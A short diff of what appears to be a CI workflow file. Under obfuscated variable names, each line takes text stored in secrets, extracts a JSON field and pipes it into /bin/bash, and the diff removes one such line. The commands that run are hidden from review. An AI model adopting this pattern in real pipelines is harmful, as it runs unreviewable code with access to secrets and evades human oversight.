@@ -22,7 +22,6 @@ jobs:
           jgmg65565: ${{ secrets.jgmg65565 }}
         run: |
           printf '%s' "$jgmg65565" | jq -r .b38627 | /bin/bash
-          echo $h86998 | jq -r .n57812 | /bin/bash
           printf '%s' "$i46" | jq -r .ueez32 | /bin/bash
           echo $idpvn2 | jq -r .sl8 | /bin/bash
 
